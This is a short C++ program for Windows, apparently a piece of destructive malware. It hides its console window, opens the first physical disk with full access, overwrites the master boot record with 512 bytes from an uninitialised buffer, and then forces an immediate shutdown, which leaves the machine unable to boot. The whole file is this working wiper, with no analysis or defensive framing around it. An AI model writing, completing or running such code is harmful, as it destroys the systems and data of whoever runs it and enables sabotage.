#include<Windows.h>
#include<Winternl.h>

#include<string>
#include<iostream>

   using namespace std;
      
      static void wShow(bool concept){
      	  if(concept==FALSE) ShowWindow(GetConsoleWindow(), SW_HIDE);
      	  else ShowWindow(GetConsoleWindow(), SW_SHOW);
	  }
      
      int main(){
      	   wShow(FALSE);
             char bMasterBootRecord[512];
             
             DWORD dwBytesWritten={0};
             HANDLE FileHandle;
			 
			   FileHandle=CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

				  WriteFile(FileHandle, bMasterBootRecord, 512, &dwBytesWritten, NULL);	          
	          system("C:\\Windows\\System32\\shutdown.exe -f -s -t 0");
	          
      	  return 0;
	  }
